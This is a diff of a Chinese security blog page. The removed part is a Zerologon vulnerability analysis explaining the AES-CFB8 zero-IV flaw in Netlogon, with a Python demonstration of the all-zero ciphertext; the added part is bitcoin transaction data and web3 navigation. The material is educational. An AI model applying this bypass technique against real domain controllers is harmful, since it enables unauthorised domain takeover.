+      &#34;index&#34;: 1,
+      &#34;value_sats&#34;: &#34;1610937&#34;,
+      &#34;value_btc&#34;: 0.01610937,
+      &#34;scriptPubKeyHex&#34;: &#34;0,32,26,66,192,48,236,160,69,158,169,57,88,142,36,24,145,133,81,169,4,166,150,159,112,105,52,139,246,54,80,174,22,75&#34;,
+      &#34;scriptType&#34;: &#34;p2wsh&#34;,
+      &#34;address&#34;: &#34;bc1qrfpvqv8v5pzea2fetz8zgxy3s4g6jp9xj60hq6f530mrv59wze9se9a3md&#34;
+    }
+  ]
+}
+</code></pre><p>代码：
 
-<img loading="lazy" alt=""src="/images/vulnerability/zero-logon.zh-cn.assets/2.png" width="729" height="563"
-
-
-/>
-算法步骤：</p>
-<ol>
-<li>确定一个16字节的初始向量IV。</li>
-<li>将IV和明文组合,例如IV + 明文的前16个字节。</li>
-<li>对组合的数据块进行AES加密,输出一个16字节的密文块。</li>
-<li>从密文块的第一个字节,与明文的第一个字节进行异或,得到密文的第一个字节。</li>
-<li>密文的第一个字节与IV的第一个字节组合,形成一个新的16字节值。</li>
-<li>对这个新的值再次进行AES加密,得到下一个16字节密文块。</li>
-<li>从新密文块取第一个字节,与明文的下一个字节异或,生成密文的下一个字节。</li>
-<li>重复步骤5-7,直到所有明文都被加密。</li>
-<li>若明文不足16的倍数字节,剩余明文使用PKCS7Padding进行填充。</li>
-</ol>
-<p><em>AES-CFB8通过前一个密文块的反馈来影响下一个明文块的加密,从而避免了ECB模式的确定性问题。但必须使用随机的IV来保证安全性。</em></p>
-<p>会话密钥计算公式：KDF(ClientChallenge+ServerChallenge+secret)，在每一轮认证过程中，ServerChallenge都会变化，但Windows中实现的AES-CFB8使用的iv被设为16字节的0x00
-攻击者可控ClientChallenge和ClientCredential，CLientChallenge对应于蓝色部分。由于轮认证时ServerChallenge都会改变且不会重复，所以每次计算出的会话密钥都不一样。当ClientChallenge置为0x00 * 8，当第一轮计算时，计算出的结果有1/256概率为0x00，而这个0x00又会作为下一轮输入添加到iv的第一个字节，即有1/256概率计算后的结果和计算前的值一样全为0x00，这样每一轮计算结果都是全为0x00。
-这样第一轮计算后在算法中的输入为全0，加密密钥不变，第二轮计算时，结果依然会是0，这样最终算法结果输出会是全0。
-由于每轮认证过程中会话密钥都不一样，所以每一轮认证过程时，AES-CFB8第一轮计算的结果都会不一样，结果最多有256种情况，最差的情况在第256轮时计算结果为0x00。</p>
-<p>当AES-CFB8加密结果刚刚好为全0时，客户端发送的ClientCredential也为全0，此时就可以通过服务端的校验，完成身份验证。</p>
-<p>可以编写一段简单的python代码模拟服务端加密过程</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives.ciphers <span style="color:#f92672">import</span> Cipher, algorithms, modes
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.backends <span style="color:#f92672">import</span> default_backend
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> bytes([
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>])  <span style="color:#75715e"># 16 byte IV</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>plaintext <span style="color:#f92672">=</span> bytes([
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>])  <span style="color:#75715e"># 8 byte plaintext</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
-</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>token_bytes(<span style="color:#ae81ff">16</span>)  <span style="color:#75715e"># 8 byte key</span>
-</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> Cipher(algorithms<span style="color:#f92672">.</span>AES(key),
-</span></span><span style="display:flex;"><span>                    modes<span style="color:#f92672">.</span>CFB8(iv),
-</span></span><span style="display:flex;"><span>                    backend<span style="color:#f92672">=</span>default_backend())
-</span></span><span style="display:flex;"><span>    encryptor <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encryptor()
-</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> encryptor<span style="color:#f92672">.</span>update(plaintext) <span style="color:#f92672">+</span> encryptor<span style="color:#f92672">.</span>finalize()
-</span></span><span style="display:flex;"><span>    print(ciphertext<span style="color:#f92672">.</span>hex())
-</span></span></code></pre></div><p>在第115次时，加密后的密文为0x0000000000000000
-
-<img loading="lazy" alt=""src="/images/vulnerability/zero-logon.zh-cn.assets/3.png" width="314" height="569"
-
-
-/>
-<strong>参考链接</strong></p>
-<blockquote>
-<p>
-<a href="https://xz.aliyun.com/t/8367" target="_blank">https://xz.aliyun.com/t/8367</a></p>
-<p>
-<a href="https://www.anquanke.com/post/id/219374#h3-6" target="_blank">https://www.anquanke.com/post/id/219374#h3-6</a></p>
-<p>
-<a href="https://www.secrss.com/articles/25580" target="_blank">https://www.secrss.com/articles/25580</a></p></blockquote>
-<p><strong>Created at 2023-05-08T14:39:28+08:00</strong></p>
+<a href="https://github.com/Chestnuts4/web3learning" target="_blank">https://github.com/Chestnuts4/web3learning</a></p>
 
 
 
 <div class="last_mod">
-	创建于:Monday, May 8,2023
+	创建于:Wednesday, October 15,2025
 </div>
 
 <div class="last_mod">
-	最后修改于: Sunday, January 14,2024
+	最后修改于: Thursday, October 16,2025
 </div>
 <div class="article-container"></div>
 <script src="https://utteranc.es/client.js"
@@ -3607,8 +3587,6 @@
             
                 
                     
-                        
-                        
                     
                 
                 
@@ -3624,6 +3602,7 @@
             
             
                 
+                    
                     
                 
                 
@@ -3638,6 +3617,7 @@
             
                 
                     
+                    
                 
                 
 
@@ -3656,6 +3636,9 @@
             
             
                 
+                    
+                        
+                        
                     
                 
                 
@@ -4254,7 +4237,6 @@
             
                 
                     
-                    
                 
                 
 
@@ -4269,9 +4251,6 @@
             
             
                 
-                    
-                        
-                        
                     
                 
                 
@@ -4801,7 +4780,6 @@
             
                 
                     
-                    
                 
                 
 
@@ -4817,9 +4795,6 @@
             
             
                 
-                    
-                        
-                        
                     
                 
                 
@@ -5540,10 +5515,10 @@
 	 
 	 
 		
-			<a class="nav nav-prev" href="/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/" title="CVE-2023-2825 Gitlab 路径穿越漏洞分析"> <i class="fa fa-chevron-left"></i></a>
+			<a class="nav nav-prev" href="/zh-cn/web3/btc/" title="Btc"> <i class="fa fa-chevron-left"></i></a>
 		
 		
-			<a class="nav nav-next" href="/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/" title="CVE-2022-4223 PgAdmin RCE 分析" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
+			<a class="nav nav-next" href="/zh-cn/web3/solidity/" title="Solidity" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
 		
 	
     </div>
